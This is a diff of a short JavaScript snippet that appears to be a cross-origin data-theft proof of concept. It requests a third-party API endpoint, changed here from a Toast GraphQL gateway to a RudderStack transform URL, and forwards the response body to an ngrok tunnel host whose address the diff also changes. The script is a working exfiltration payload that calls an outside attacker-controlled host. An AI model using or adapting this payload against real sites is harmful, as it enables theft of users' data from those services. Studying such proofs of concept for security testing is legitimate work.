@@ -1,12 +1,12 @@
 <script>
   const req = new XMLHttpRequest();
-  req.open("GET", "https://ws-api.toasttab.com/do-federated-gateway/v1/graphql", true);
+  req.open("GET", "https://acornsprod-dataplane.rudderstack.com/transform", true);
   req.onload = function() {
     if (req.status === 200) {
       const res = req.responseText;
 
       const req2 = new XMLHttpRequest();
-      req2.open("GET", "https://767c-2401-4900-1cab-f8df-b0b0-3da7-1b5d-207c.ngrok-free.app/" + encodeURIComponent(res), true);
+      req2.open("GET", "https://9aeb-2401-4900-1cab-f8df-c17-e668-f471-182e.ngrok-free.app/" + encodeURIComponent(res), true);
       req2.send();
     }
   };
